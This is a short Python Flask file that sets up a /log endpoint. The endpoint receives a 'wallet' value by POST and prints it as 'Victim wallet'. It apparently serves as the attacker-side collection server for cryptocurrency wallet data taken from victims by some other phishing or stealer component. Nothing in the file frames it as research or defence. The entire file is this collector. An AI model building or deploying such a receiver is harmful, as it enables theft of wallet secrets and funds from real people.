from flask import Flask, request
app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_wallet():
    wallet = request.json.get("wallet")
    print(f"Victim wallet: {wallet}")
    return "ok"
